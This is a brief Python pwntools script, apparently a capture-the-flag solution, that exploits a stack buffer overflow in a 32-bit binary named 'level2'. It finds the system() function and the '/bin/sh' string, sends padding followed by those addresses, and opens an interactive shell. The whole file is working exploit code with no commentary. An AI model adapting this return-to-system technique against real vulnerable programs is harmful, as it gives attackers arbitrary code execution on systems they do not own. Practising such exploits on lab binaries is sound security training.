from pwn import *

elf = ELF('./level2')

sys_addr = elf.symbols["system"]

print(sys_addr)

binsh_addr = next(elf.search(b'/bin/sh'))

print(binsh_addr)

payload = cyclic( 0x88 + 4 ) + p32(sys_addr) + p32(0xdeedbeef) + p32(binsh_addr)

io = process("./level2")

io.recvline()

io.sendline(payload)

io.interactive()

